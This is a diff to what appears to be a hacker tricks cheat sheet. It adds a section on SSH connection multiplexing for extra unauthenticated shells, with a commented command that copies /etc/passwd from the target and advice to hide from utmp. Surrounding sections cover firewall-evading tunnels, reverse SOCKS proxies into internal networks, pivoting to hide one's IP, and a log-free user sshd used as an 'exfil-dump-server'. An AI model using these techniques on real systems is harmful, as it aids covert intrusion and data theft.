@@ -21,6 +21,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Execute in parrallel with separate logfiles](#parallel)
 1. [SSH](#ssh)
    1. [Almost invisible SSH](#ssh-invisible)
+   1. [Multiple shells via 1 SSH/TCP connection](#ssh-master)
    1. [SSH tunnel](#ssh-tunnel)
    1. [SSH socks5 tunnel](#ssh-socks-tunnel)
    1. [SSH to NATed host](#ssh-j)
@@ -334,8 +335,26 @@ thcssh()
 }
 ```
 
+<a id="ssh-master"></a>
+**2.ii Multiple shells via 1 SSH/TCP connection**
+
+Have one TCP connection to the target and allow multiple users to piggyback on the same TCP connection to open further shell sessions.
+
+Create a Master Connection:
+```sh
+ssh -M -S .sshmux user@server.org
+```
+
+Create further shell-sessions using the same (single) Master-TCP connection from above (no password/auth needed):
+```sh
+ssh -S .sshmux NONE
+#ssh -S .sshmux NONE ls -al
+#scp -o "ControlPath=.sshmux" NONE:/etc/passwd .
+```
+Can be combined with [thcssh](#ssh-invisible) to hide from utmp.
+
 <a id="ssh-tunnel"></a>
-**2.ii SSH tunnel**
+**2.iii SSH tunnel**
 
 We use this all the time to circumvent local firewalls and IP filtering:
 ```sh
@@ -352,7 +371,7 @@ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org
 Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).
 
 <a id="ssh-socks-tunnel"></a>
-**2.iii SSH socks4/5 tunnel**
+**2.iv SSH socks4/5 tunnel**
 
 OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.
 
@@ -370,7 +389,7 @@ ssh -g -R 1080 user@server.org
 The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computer on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).
 
 <a id="ssh-j"></a>
-**2.iv SSH to a host behind NAT**
+**2.v SSH to a host behind NAT**
 
 [ssh-j.com](http://ssh-j.com) provides a great relay service: To access a host behind NAT/Firewall (via SSH).
 
@@ -400,7 +419,7 @@ The ssh connection goes via ssh-j.com into the reverse tunnel to the host behind
 
 
 <a id="ssh-pj"></a>
-**2.v SSH pivoting to multiple servers**
+**2.vi SSH pivoting to multiple servers**
 
 SSH ProxyJump can save you a lot of time and hassle when working with remote servers. Let's assume the scenario:  
 
@@ -427,9 +446,9 @@ kali@local-kali$ ssh -J c2@10.25.237.119 jumpuser@192.168.5.135
 > We use this as well to hide our IP address when logging into servers. 
 
 <a id="sshd-user"></a>
-**2.vi SSHD as user land**
+**2.vii SSHD as user land**
 
-It is possible to start a SSHD server as a non-root user and use this to multiplex or forward TCP connection (without logging and when the systemwide SSHD forbids forwarding/multiplexing):
+It is possible to start a SSHD server as a non-root user and use this to multiplex or forward TCP connection (without logging and when the systemwide SSHD forbids forwarding/multiplexing) or as a quick exfil-dump-server that runs as non-root:
 ```sh
 # On the server, as non-root user 'joe':
 mkdir -p ~/.ssh 2>/dev/null
